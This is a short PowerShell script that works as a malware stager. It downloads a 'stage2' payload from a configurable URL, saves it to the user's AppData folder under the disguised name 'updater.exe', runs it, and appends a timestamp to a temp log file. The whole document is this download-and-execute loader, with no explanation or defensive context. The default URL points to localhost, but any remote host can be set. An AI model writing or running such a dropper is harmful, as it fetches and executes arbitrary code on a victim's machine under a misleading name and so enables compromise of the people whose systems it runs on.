[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://localhost:8080/stage2.ps1",
    [string]$DropPath = "$env:APPDATA\updater.exe"
)
(New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $DropPath)
Start-Process -FilePath $DropPath
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
